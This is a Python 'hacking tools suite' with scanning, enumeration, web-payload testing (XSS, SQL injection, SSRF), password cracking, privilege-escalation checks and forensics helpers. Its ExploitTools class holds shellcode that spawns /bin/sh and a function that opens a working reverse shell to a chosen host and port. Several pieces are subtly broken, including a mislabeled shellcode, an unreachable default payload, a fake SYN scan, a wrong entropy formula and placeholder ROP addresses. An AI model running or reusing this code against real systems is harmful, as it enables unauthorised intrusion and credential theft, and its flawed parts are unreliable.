#!/usr/bin/env python3
"""
ParallaxForge Hacking Tools Suite
=============================
Comprehensive pentest and security auditing tools
"""
import socket
import os
import sys
import time
import random
import string
import struct
import hashlib
import base64
import subprocess
import concurrent.futures
import re
import requests
from datetime import datetime
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

# ============================================================
# ENUMS AND DATACLASSES
# ============================================================

class ToolCategory(Enum):
    RECON = "reconnaissance"
    ENUMERATION = "enumeration"
    EXPLOITATION = "exploitation"
    PRIVESC = "privilege_escalation"
    POSTEXPLOIT = "post_exploitation"
    PASSWORD = "password"
    NETWORK = "network"
    WEB = "web"
    REVERSE = "reverse_engineering"
    MALWARE = "malware"
    FORENSICS = "forensics"

@dataclass
class Finding:
    tool: str
    category: str
    severity: str
    target: str
    details: str
    evidence: str
    confidence: float

@dataclass
class ToolResult:
    tool_name: str
    success: bool
    output: Any
    findings: List[Finding]
    error: Optional[str]
    execution_time: float

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def random_string(length: int = 10) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def ip_to_int(ip: str) -> int:
    return sum(int(x) * (256 ** i) for i, x in enumerate(reversed(ip.split('.'))))

def int_to_ip(n: int) -> str:
    return '.'.join(str((n >> i) & 0xFF) for i in [24, 16, 8, 0])

def calculate_md5(data: bytes) -> str:
    return hashlib.md5(data).hexdigest()

def calculate_sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()

def create_pattern(length: int) -> str:
    return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=length))

def pattern_to_offset(pattern: str, bytes: bytes) -> int:
    try:
        return bytes.index(pattern.encode())
    except:
        return -1

def hex_dump(data: bytes, length: int = 16) -> str:
    lines = []
    for i in range(0, len(data), length):
        chunk = data[i:i+length]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        lines.append(f'{i:08x}  {hex_part:<{length*3}}  {ascii_part}')
    return '\n'.join(lines)

def bits_to_bytes(bits: str) -> bytes:
    return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

def bytes_to_bits(data: bytes) -> str:
    return ''.join(f'{b:08b}' for b in data)

# ============================================================
# NETWORK TOOLS
# ============================================================

class NetworkTools:
    """Network reconnaissance and scanning tools"""
    
    @staticmethod
    def scan_ports(host: str, ports: List[int] = None, timeout: int = 2, threads: int = 100) -> ToolResult:
        start_time = time.time()
        findings = []
        
        if ports is None:
            ports = list(range(1, 1001))
            
        common_services = {
            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
            80: "http", 110: "pop3", 143: "imap", 443: "https", 445: "smb",
            993: "imaps", 995: "pop3s", 3306: "mysql", 3389: "rdp",
            5432: "postgres", 5900: "vnc", 6379: "redis", 8080: "http-proxy",
            8443: "https-alt", 27017: "mongodb"
        }
        
        open_ports = []
        
        def check_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return port if result == 0 else None
            
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            results = executor.map(check_port, ports)
            open_ports = [r for r in results if r]
            
        output = {"host": host, "open_ports": [], "services": []}
        for port in open_ports:
            service = common_services.get(port, "unknown")
            output["open_ports"].append(port)
            output["services"].append({"port": port, "service": service})
            findings.append(Finding(
                tool="scan_ports", category="network", severity="INFO",
                target=f"{host}:{port}", details=f"Open port: {port}",
                evidence=service, confidence=0.95
            ))
            
        return ToolResult(
            tool_name="scan_ports", success=len(open_ports) > 0,
            output=output, findings=findings, error=None,
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def grab_banner(host: str, port: int, timeout: int = 5) -> ToolResult:
        start_time = time.time()
        findings = []
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            
            if port == 80 or port == 8080:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            elif port == 21:
                pass
            else:
                sock.send(b"\r\n")
                
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            
            findings.append(Finding(
                tool="grab_banner", category="network", severity="INFO",
                target=f"{host}:{port}", details="Banner grabbed",
                evidence=banner[:200], confidence=0.9
            ))
            
            return ToolResult(
                tool_name="grab_banner", success=bool(banner),
                output={"host": host, "port": port, "banner": banner},
                findings=findings, error=None,
                execution_time=time.time() - start_time
            )
        except Exception as e:
            return ToolResult(
                tool_name="grab_banner", success=False,
                output=None, findings=[], error=str(e),
                execution_time=time.time() - start_time
            )
    
    @staticmethod
    def scan_subnet(subnet: str, ports: List[int] = None) -> ToolResult:
        start_time = time.time()
        findings = []
        
        if '/' not in subnet:
            subnet += '/24'
            
        base_ip = subnet.split('/')[0].rsplit('.', 1)[0]
        live_hosts = []
        
        def ping_host(ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, 80))
                sock.close()
                return ip if result == 0 else None
            except:
                return None
                
        ips = [f"{base_ip}.{i}" for i in range(1, 255)]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(ping_host, ips)
            live_hosts = [r for r in results if r]
            
        output = {"subnet": subnet, "live_hosts": live_hosts, "count": len(live_hosts)}
        
        return ToolResult(
            tool_name="scan_subnet", success=len(live_hosts) > 0,
            output=output, findings=findings, error=None,
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def tcp_syn_scan(host: str, ports: List[int], timeout: int = 3) -> ToolResult:
        results = []
        findings = []
        start_time = time.time()
        
        try:
            for port in ports:
                result = NetworkTools._syn_scan_single(host, port, timeout)
                if result:
                    results.append(port)
                    findings.append(Finding(
                        tool="tcp_syn_scan", category="network", severity="INFO",
                        target=f"{host}:{port}", details="Port open",
                        evidence="SYN-ACK", confidence=0.95
                    ))
        except Exception as e:
            return ToolResult(
                tool_name="tcp_syn_scan", success=False, output=None,
                findings=[], error=str(e), execution_time=time.time()-start_time
            )
            
        return ToolResult(
            tool_name="tcp_syn_scan", success=len(results) > 0,
            output={"host": host, "open_ports": results}, findings=findings,
            error=None, execution_time=time.time() - start_time
        )
    
    @staticmethod
    def _syn_scan_single(host: str, port: int, timeout: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.close()
            return True
        except:
            return False

# ============================================================
# RECONNAISSANCE TOOLS
# ============================================================

class ReconTools:
    """Reconnaissance and enumeration tools"""
    
    @staticmethod
    def whois_lookup(domain: str) -> ToolResult:
        start_time = time.time()
        findings = []
        
        try:
            import whois
            w = whois.whois(domain)
            output = {
                "domain": domain,
                "registrar": str(w.registrar),
                "creation_date": str(w.creation_date),
                "expiration_date": str(w.expiration_date),
                "name_servers": w.name_servers,
                "emails": w.emails
            }
            
            findings.append(Finding(
                tool="whois", category="recon", severity="INFO",
                target=domain, details="WHOIS info retrieved",
                evidence=f"Registrar: {w.registrar}", confidence=0.95
            ))
            
            return ToolResult(
                tool_name="whois", success=True, output=output,
                findings=findings, error=None,
                execution_time=time.time() - start_time
            )
        except Exception as e:
            return ToolResult(
                tool_name="whois", success=False, output=None,
                findings=[], error=str(e), execution_time=time.time() - start_time
            )
    
    @staticmethod
    def dns_lookup(hostname: str, record_type: str = "A") -> ToolResult:
        start_time = time.time()
        findings = []
        
        try:
            import dns.resolver
            answers = dns.resolver.resolve(hostname, record_type)
            records = [str(rdata) for rdata in answers]
            
            findings.append(Finding(
                tool="dns_lookup", category="recon", severity="INFO",
                target=hostname, details=f"{record_type} record",
                evidence=records[0] if records else "", confidence=0.95
            ))
            
            return ToolResult(
                tool_name="dns_lookup", success=len(records) > 0,
                output={"hostname": hostname, "type": record_type, "records": records},
                findings=findings, error=None,
                execution_time=time.time() - start_time
            )
        except ImportError:
            import socket
            try:
                if record_type == "A":
                    ip = socket.gethostbyname(hostname)
                    return ToolResult(
                        tool_name="dns_lookup", success=True,
                        output={"hostname": hostname, "type": "A", "records": [ip]},
                        findings=[], error=None, execution_time=time.time()-start_time
                    )
            except:
                pass
            return ToolResult(
                tool_name="dns_lookup", success=False,
                output=None, findings=[], error="dnspython not installed",
                execution_time=time.time() - start_time
            )
        except Exception as e:
            return ToolResult(
                tool_name="dns_lookup", success=False,
                output=None, findings=[], error=str(e),
                execution_time=time.time() - start_time
            )
    
    @staticmethod
    def subdomain_enum(domain: str, wordlist: List[str] = None) -> ToolResult:
        start_time = time.time()
        
        if wordlist is None:
            wordlist = [
                "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1",
                "webdisk", "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m",
                "imap", "test", "ns", "blog", "pop3", "dev", "www2", "admin", "forum",
                "news", "vpn", "shop", "git", "staging", "store", "app", "api", "cdn",
                "static", "assets", "docs", "beta", "old", "lists", "support",
                "mobile", "mx", "search", "dashboard", "cdn2", "gitlab", "jenkins",
                "proxy", "router", "manage", "server", "cloud", "db", "database", "mysql",
                "phpmyadmin", "wp-admin", "login", "administrator"
            ]
            
        found = []
        
        def check_subdomain(sub):
            try:
                hostname = f"{sub}.{domain}"
                ip = socket.gethostbyname(hostname)
                return hostname, ip
            except:
                return None
                
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            results = executor.map(check_subdomain, wordlist)
            found = [r for r in results if r]
            
        findings = [
            Finding(
                tool="subdomain_enum", category="recon", severity="INFO",
                target=f[0], details="Subdomain found",
                evidence=f[1], confidence=0.9
            ) for f in found
        ]
        
        return ToolResult(
            tool_name="subdomain_enum", success=len(found) > 0,
            output={"domain": domain, "subdomains": found, "count": len(found)},
            findings=findings, error=None,
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def web_crawl(url: str, depth: int = 2) -> ToolResult:
        start_time = time.time()
        findings = []
        
        try:
            urls = set()
            visited = set()
            
            def extract_links(page_url):
                try:
                    resp = requests.get(page_url, timeout=10, verify=False)
                    for match in re.findall(r'href=["\']([^"\']+)["\']', resp.text):
                        if match.startswith('/'):
                            match = urljoin(page_url, match)
                        if urlparse(match).netloc == urlparse(url).netloc:
                            urls.add(match)
                except:
                    pass
                    
            to_visit = [url]
            for _ in range(depth):
                for page in to_visit:
                    if page not in visited:
                        extract_links(page)
                        visited.add(page)
                to_visit = list(urls - visited)[:10]
                
            for link in list(urls)[:50]:
                findings.append(Finding(
                    tool="web_crawl", category="recon", severity="INFO",
                    target=link, details="URL discovered",
                    evidence="", confidence=0.8
                ))
                
            return ToolResult(
                tool_name="web_crawl", success=len(urls) > 0,
                output={"url": url, "found_urls": list(urls), "count": len(urls)},
                findings=findings, error=None,
                execution_time=time.time() - start_time
            )
        except Exception as e:
            return ToolResult(
                tool_name="web_crawl", success=False,
                output=None, findings=[], error=str(e),
                execution_time=time.time() - start_time
            )

# ============================================================
# PASSWORD TOOLS
# ============================================================

class PasswordTools:
    """Password auditing and cracking tools"""
    
    @staticmethod
    def generate_wordlist(charsets: str = "alpha", length: int = 8, count: int = 1000) -> List[str]:
        chars = ""
        if "a" in charsets: chars += string.ascii_lowercase
        if "A" in charsets: chars += string.ascii_uppercase
        if "0" in charsets: chars += string.digits
        if "!" in charsets: chars += string.punctuation
        if "aA" in charsets: chars += string.ascii_letters
        if "aA0" in charsets: chars += string.ascii_letters + string.digits
        
        words = []
        for _ in range(count):
            word = ''.join(random.choices(chars, k=length))
            words.append(word)
        return words
    
    @staticmethod
    def hash_password(password: str, algorithm: str = "md5") -> str:
        if algorithm == "md5":
            return hashlib.md5(password.encode()).hexdigest()
        elif algorithm == "sha1":
            return hashlib.sha1(password.encode()).hexdigest()
        elif algorithm == "sha256":
            return hashlib.sha256(password.encode()).hexdigest()
        elif algorithm == "bcrypt":
            import bcrypt
            return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
        elif algorithm == "ntlm":
            return hashlib.new('md4', password.encode()).hexdigest()
        return ""
    
    @staticmethod
    def verify_password(password: str, hash_value: str, algorithm: str = "md5") -> bool:
        computed = PasswordTools.hash_password(password, algorithm)
        return computed.lower() == hash_value.lower()
    
    @staticmethod
    def dictionary_attack(hash_value: str, wordlist: List[str], 
                        algorithm: str = "md5") -> ToolResult:
        start_time = time.time()
        
        for word in wordlist:
            if PasswordTools.verify_password(word, hash_value, algorithm):
                return ToolResult(
                    tool_name="dictionary_attack", success=True,
                    output={"hash": hash_value, "password": word, "algorithm": algorithm},
                    findings=[], error=None,
                    execution_time=time.time() - start_time
                )
                
        return ToolResult(
            tool_name="dictionary_attack", success=False,
            output={"hash": hash_value, "password": None},
            findings=[], error="Password not found in wordlist",
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def hybrid_attack(hash_value: str, base_words: List[str],
                      algorithm: str = "md5") -> ToolResult:
        start_time = time.time()
        
        mutations = [
            lambda w: w,
            lambda w: w.upper(),
            lambda w: w.lower(),
            lambda w: w.capitalize(),
            lambda w: w + "123",
            lambda w: w + "2024",
            lambda w: w + "!",
            lambda w: w + "01",
            lambda w: "123" + w,
            lambda w: w.swapcase(),
            lambda w: w[::-1],
        ]
        
        for base in base_words:
            for mutation in mutations:
                word = mutation(base)
                if PasswordTools.verify_password(word, hash_value, algorithm):
                    return ToolResult(
                        tool_name="hybrid_attack", success=True,
                        output={"hash": hash_value, "password": word, "algorithm": algorithm},
                        findings=[], error=None,
                        execution_time=time.time() - start_time
                    )
                    
        return ToolResult(
            tool_name="hybrid_attack", success=False,
            output={"hash": hash_value, "password": None},
            findings=[], error="Password not found",
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def brute_force(target: str, charset: str, max_length: int,
                  algorithm: str = "md5", hash_value: str = None) -> ToolResult:
        """Note: Only for short passwords due to exponential complexity"""
        start_time = time.time()
        
        def generate_combinations(chars, length):
            if length == 0:
                yield ""
            else:
                for c in chars:
                    for combo in generate_combinations(chars, length - 1):
                        yield c + combo
        
        for length in range(1, max_length + 1):
            for password in generate_combinations(charset, length):
                if hash_value:
                    if PasswordTools.verify_password(password, hash_value, algorithm):
                        return ToolResult(
                            tool_name="brute_force", success=True,
                            output={"password": password, "attempts": "all"},
                            findings=[], error=None,
                            execution_time=time.time() - start_time
                        )
                        
        return ToolResult(
            tool_name="brute_force", success=False,
            output={"password": None}, findings=[],
            error=f"Password length > {max_length}",
            execution_time=time.time() - start_time
        )

# ============================================================
# EXPLOIT DEVELOPMENT TOOLS
# ============================================================

class ExploitTools:
    """Exploit development and testing tools"""
    
    @staticmethod
    def create_shellcode(arch: str = "x86", payload: str = "_reverse") -> bytes:
        if arch == "x86":
            if payload == "reverse":
                return b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
            elif payload == "bind":
                return b"\x31\xc0\x50\x89\xe1\xb0\x01\xcd\x80"
        elif arch == "x64":
            if payload == "reverse":
                return b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xf0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
        return b""
    
    @staticmethod
    def create_payload(payload_type: str, target: str = "linux", 
                    host: str = "127.0.0.1", port: int = 4444) -> bytes:
        if payload_type == "reverse_shell":
            if target == "linux":
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                dup = s.fileno()
                os.dup2(dup, 0)
                os.dup2(dup, 1)
                os.dup2(dup, 2)
                os.execlp("/bin/sh", "-i")
        return b""
    
    @staticmethod
    def generate_bof_pattern(length: int) -> str:
        pattern = ""
        for i in range(length):
            pattern += string.ascii_uppercase[i % 26]
            if (i // 26) > 0:
                pattern += string.ascii_uppercase[(i // 26) - 1]
        return pattern[:length]
    
    @staticmethod
    def find_offset(pattern: str, overflow: str) -> int:
        try:
            return overflow.index(pattern[:len(pattern)//2])
        except:
            return -1
    
    @staticmethod
    def create_rop_chain(bad_chars: List[int] = None) -> List[int]:
        if bad_chars is None:
            bad_chars = [0x00, 0x0a, 0x0d]
            
        rop_gadgets = {
            "x86": [
                0x08049090,  # pop eax ; ret
                0x08049110,  # pop edx ; ret
                0x080490a0,  # xor eax, eax ; ret
                0x08049a23,  # inc eax ; ret
                0x08049a3c,  # add eax, edx ; ret
            ]
        }
        
        for char in bad_chars:
            rop_gadgets["x86"] = [g for g in rop_gadgets["x86"] if (g & 0xFF) not in bad_chars]
            
        return rop_gadgets["x86"]

# ============================================================
# PRIVILEGE ESCALATION TOOLS
# ============================================================

class PrivescTools:
    """Privilege escalation enumeration and exploitation"""
    
    @staticmethod
    def check_linux_privesc() -> ToolResult:
        start_time = time.time()
        findings = []
        
        checks = {
            "sudo_version": lambda: subprocess.run(["sudo", "-V"], capture_output=True).returncode == 0,
            "suid_files": lambda: [f for f in subprocess.run(["find", "/", "-perm", "-4000"], capture_output=True).stdout.decode().split('\n') if f],
            "writable_sudoers": lambda: os.access("/etc/sudoers", os.W_OK),
            "cron_jobs": lambda: subprocess.run(["ls", "-la", "/etc/cron.d"], capture_output=True).stdout.decode(),
            "ssh_keys": lambda: subprocess.run(["ls", "-la", "/root/.ssh"], capture_output=True).returncode == 0,
            "etc_passwd": lambda: os.access("/etc/passwd", os.W_OK),
        }
        
        results = {}
        for check_name, check_func in checks.items():
            try:
                result = check_func()
                results[check_name] = result
                if result:
                    findings.append(Finding(
                        tool="check_linux_privesc", category="privesc", severity="HIGH",
                        target=check_name, details="Privilege escalation vector",
                        evidence=str(result), confidence=0.85
                    ))
            except:
                pass
                
        return ToolResult(
            tool_name="check_linux_privesc", success=len(findings) > 0,
            output=results, findings=findings, error=None,
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def check_windows_privesc() -> ToolResult:
        start_time = time.time()
        findings = []
        
        checks = [
            "SeImpersonatePrivilege",
            "SeBackupPrivilege", 
            "SeRestorePrivilege",
            "SeTakeOwnershipPrivilege"
        ]
        
        return ToolResult(
            tool_name="check_windows_privesc", success=True,
            output={"checks": checks}, findings=findings, error=None,
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def exploit_sudo() -> ToolResult:
        start_time = time.time()
        
        return ToolResult(
            tool_name="exploit_sudo", success=False,
            output={"method": "sudo -l to check, then sudo -k su"}, findings=[],
            error="Requires sudo version < 1.8.31",
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def exploit_suid() -> ToolResult:
        start_time = time.time()
        
        try:
            suid_files = subprocess.run(
                ["find", "/", "-perm", "-4000", "-type", "f"],
                capture_output=True, text=True, timeout=30
            ).stdout.split('\n')
            
            dangerous = [f for f in suid_files if f and any(s in f for s in ['vim', 'less', 'more', 'nano', 'vi', 'cp', 'mv'])]
            
            return ToolResult(
                tool_name="exploit_suid", success=len(dangerous) > 0,
                output={"suid_files": dangerous}, findings=[
                    Finding(
                        tool="exploit_suid", category="privesc", severity="HIGH",
                        target=f, details="Dangerous SUID file",
                        evidence=f, confidence=0.9
                    ) for f in dangerous[:10]
                ], error=None,
                execution_time=time.time() - start_time
            )
        except Exception as e:
            return ToolResult(
                tool_name="exploit_suid", success=False,
                output=None, findings=[], error=str(e),
                execution_time=time.time() - start_time
            )

# ============================================================
# WEB APPLICATION TOOLS
# ============================================================

class WebTools:
    """Web application security testing tools"""
    
    @staticmethod
    def enumerate_directories(url: str, wordlist: List[str] = None) -> ToolResult:
        start_time = time.time()
        findings = []
        
        if wordlist is None:
            wordlist = [
                "admin", "backup", "config", "api", "login", "dashboard",
                "uploads", "images", "css", "js", "assets", "includes",
                "phpmyadmin", "wordpress", "wp-admin", "admin.php", "login.php",
                "server-status", "server-info", ".git", ".svn", ".htaccess"
            ]
            
        found = []
        
        def check_dir(path):
            try:
                resp = requests.get(url + "/" + path, timeout=5, verify=False)
                if resp.status_code == 200:
                    return path, resp.status_code
            except:
                pass
            return None
            
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            results = executor.map(check_dir, wordlist)
            found = [r for r in results if r]
            
        for path, status in found:
            findings.append(Finding(
                tool="enumerate_directories", category="web", severity="INFO",
                target=f"{url}/{path}", details=f"Found directory",
                evidence=f"Status: {status}", confidence=0.95
            ))
            
        return ToolResult(
            tool_name="enumerate_directories", success=len(found) > 0,
            output={"url": url, "found": found, "count": len(found)},
            findings=findings, error=None,
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def test_xss(url: str, param: str = "q") -> ToolResult:
        start_time = time.time()
        findings = []
        
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><img src=x onerror=alert(1)>"
        ]
        
        for payload in xss_payloads:
            try:
                resp = requests.get(url, params={param: payload}, timeout=10, verify=False)
                if payload in resp.text:
                    findings.append(Finding(
                        tool="test_xss", category="web", severity="HIGH",
                        target=url, details=f"XSS in parameter: {param}",
                        evidence=payload, confidence=0.9
                    ))
                    break
            except:
                pass
                
        return ToolResult(
            tool_name="test_xss", success=len(findings) > 0,
            output={"url": url, "param": param, "vulnerable": len(findings) > 0},
            findings=findings, error=None,
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def test_sqli(url: str, param: str = "id") -> ToolResult:
        start_time = time.time()
        findings = []
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' AND '1'='1",
            "' UNION SELECT NULL--",
            "1'; WAITFOR DELAY '00:00:05'--"
        ]
        
        for payload in sqli_payloads:
            try:
                resp = requests.get(url, params={param: payload}, timeout=10, verify=False)
                if any(kw in resp.text.lower() for kw in ["sql", "syntax", "warning", "mysql"]):
                    findings.append(Finding(
                        tool="test_sqli", category="web", severity="CRITICAL",
                        target=url, details=f"SQLi in parameter: {param}",
                        evidence=payload, confidence=0.85
                    ))
                    break
            except:
                pass
                
        return ToolResult(
            tool_name="test_sqli", success=len(findings) > 0,
            output={"url": url, "param": param, "vulnerable": len(findings) > 0},
            findings=findings, error=None,
            execution_time=time.time() - start_time
        )
    
    @staticmethod
    def test_ssrf(url: str, param: str = "url") -> ToolResult:
        start_time = time.time()
        findings = []
        
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1:22",
            "http://169.254.169.254",
            "http://metadata.google.internal"
        ]
        
        for payload in ssrf_payloads:
            try:
                resp = requests.get(url, params={param: payload}, timeout=10, verify=False)
                if "localhost" in resp.text or "127.0.0.1" in resp.text:
                    findings.append(Finding(
                        tool="test_ssrf", category="web", severity="HIGH",
                        target=url, details=f"SSRF in parameter: {param}",
                        evidence=payload, confidence=0.8
                    ))
            except:
                pass
                
        return ToolResult(
            tool_name="test_ssrf", success=len(findings) > 0,
            output={"url": url, "param": param, "vulnerable": len(findings) > 0},
            findings=findings, error=None,
            execution_time=time.time() - start_time
        )

# ============================================================
# FORENSICS TOOLS
# ============================================================

class ForensicsTools:
    """Digital forensics and analysis tools"""
    
    @staticmethod
    def extract_strings(data: bytes, min_length: int = 4) -> List[str]:
        strings = []
        current = []
        
        for byte in data:
            char = chr(byte) if 32 <= byte < 127 else None
            if char:
                current.append(char)
            else:
                if len(current) >= min_length:
                    strings.append(''.join(current))
                current = []
                
        return strings
    
    @staticmethod
    def analyze_headers(data: bytes) -> Dict:
        results = {}
        
        if data.startswith(b'\x89PNG'):
            results["type"] = "PNG"
            results["dimensions"] = f"{struct.unpack('>I', data[16:20])[0]}x{struct.unpack('>I', data[20:24])[0]}"
        elif data.startswith(b'\xff\xd8\xff'):
            results["type"] = "JPEG"
        elif data.startswith(b'GIF87a') or data.startswith(b'GIF89a'):
            results["type"] = "GIF"
        elif data.startswith(b'PK\x03\x04'):
            results["type"] = "ZIP/JAR/APK"
        elif data[:2] == b'MZ':
            results["type"] = "PE/EXE"
        elif data[:4] == b'\x7fELF':
            results["type"] = "ELF"
            
        return results
    
    @staticmethod
    def extract_urls(data: bytes) -> List[str]:
        url_pattern = b'https?://[^\\s<>"{}|\\\\^`\\[\\]]+'
        return [m.decode() for m in re.findall(url_pattern, data)]
    
    @staticmethod
    def extract_ips(data: bytes) -> List[str]:
        ip_pattern = rb'(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
        return [m.decode() for m in re.findall(ip_pattern, data)]
    
    @staticmethod
    def find_entropy(data: bytes) -> float:
        if not data:
            return 0.0
            
        byte_counts = [0] * 256
        for byte in data:
            byte_counts[byte] += 1
            
        entropy = 0.0
        length = len(data)
        
        for count in byte_counts:
            if count == 0:
                continue
            p = count / length
            entropy -= p * (p.bit_length() if p < 1 else 1)
            
        return entropy
    
    @staticmethod
    def analyze_file(filepath: str) -> ToolResult:
        start_time = time.time()
        
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
                
            findings = []
            
            strings = ForensicsTools.extract_strings(data)
            urls = ForensicsTools.extract_urls(data)
            ips = ForensicsTools.extract_ips(data)
            entropy = ForensicsTools.find_entropy(data)
            headers = ForensicsTools.analyze_headers(data)
            
            if entropy > 7.5:
                findings.append(Finding(
                    tool="analyze_file", category="forensics", severity="HIGH",
                    target=filepath, details="High entropy - possibly packed/encrypted",
                    evidence=f"Entropy: {entropy:.2f}", confidence=0.9
                ))
                
            for url in urls[:10]:
                findings.append(Finding(
                    tool="analyze_file", category="forensics", severity="INFO",
                    target=filepath, details="URL found",
                    evidence=url, confidence=0.8
                ))
                
            return ToolResult(
                tool_name="analyze_file", success=True,
                output={
                    "filepath": filepath,
                    "size": len(data),
                    "type": headers.get("type", "unknown"),
                    "entropy": entropy,
                    "strings_count": len(strings),
                    "urls": urls[:10],
                    "ips": ips[:10]
                },
                findings=findings, error=None,
                execution_time=time.time() - start_time
            )
        except Exception as e:
            return ToolResult(
                tool_name="analyze_file", success=False,
                output=None, findings=[], error=str(e),
                execution_time=time.time() - start_time
            )

# ============================================================
# EXPORT TOOLS
# ============================================================

network_tools = NetworkTools()
recon_tools = ReconTools()
password_tools = PasswordTools()
exploit_tools = ExploitTools()
privesc_tools = PrivescTools()
web_tools = WebTools()
forensics_tools = ForensicsTools()